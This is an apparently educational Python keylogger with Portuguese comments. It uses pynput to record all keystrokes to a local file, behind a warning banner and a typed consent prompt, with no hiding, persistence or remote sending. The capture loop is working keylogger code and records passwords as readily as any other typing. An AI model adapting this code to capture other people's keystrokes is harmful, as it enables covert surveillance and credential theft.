# ⚠️ Demonstração educacional de captura local de eventos de teclado.
# Use somente em sistema próprio ou com autorização explícita e informada.
# O programa exige confirmação, mostra a captura em primeiro plano e encerra
# com ESC. Não há modo oculto, persistência, ofuscação ou envio remoto.

import sys
from datetime import datetime

from pynput import keyboard

LOG_FILE = "keylog.txt"


def _banner() -> None:
    print("=" * 60)
    print(" KEYLOGGER EDUCACIONAL — USO RESTRITO")
    print("=" * 60)
    print("Este programa captura teclas pressionadas e grava em")
    print(f"'{LOG_FILE}' (arquivo local).")
    print()
    print("É PROIBIDO usar este software em qualquer sistema sem")
    print("consentimento explícito do proprietário.")
    print("Use apenas em máquinas virtuais ou máquinas próprias.")
    print()


def _confirmar() -> bool:
    resposta = input(
        "Digite 'CONCORDO' para confirmar que você leu o aviso e vai\n"
        "usar este software apenas de forma ética e autorizada: "
    ).strip().upper()
    return resposta == "CONCORDO"


def _log(msg: str) -> None:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a", encoding="utf-8") as stream:
        stream.write(f"[{ts}] {msg}\n")


def on_press(key):
    try:
        tecla = key.char
    except AttributeError:
        if key == keyboard.Key.space:
            tecla = " "
        elif key == keyboard.Key.enter:
            tecla = "<ENTER>"
        elif key == keyboard.Key.tab:
            tecla = "<TAB>"
        elif key == keyboard.Key.backspace:
            tecla = "<BACKSPACE>"
        elif key == keyboard.Key.esc:
            print("\n[!] ESC pressionado — encerrando e salvando log.")
            _log("=== SESSÃO ENCERRADA ===")
            return False
        else:
            tecla = f"<{key.name.upper()}>"

    _log(repr(tecla))
    print(".", end="", flush=True)


def on_release(_key):
    pass


def main() -> int:
    _banner()
    if not _confirmar():
        print("Confirmação não fornecida. Encerrando.")
        return 1

    _log(f"=== SESSÃO INICIADA ({datetime.now().isoformat()}) ===")
    print("Captura iniciada. Pressione ESC para encerrar.\n")

    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\n[!] Interrompido pelo usuário.")
        _log("=== SESSÃO ENCERRADA (KeyboardInterrupt) ===")

    print(f"Log salvo em: {LOG_FILE}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
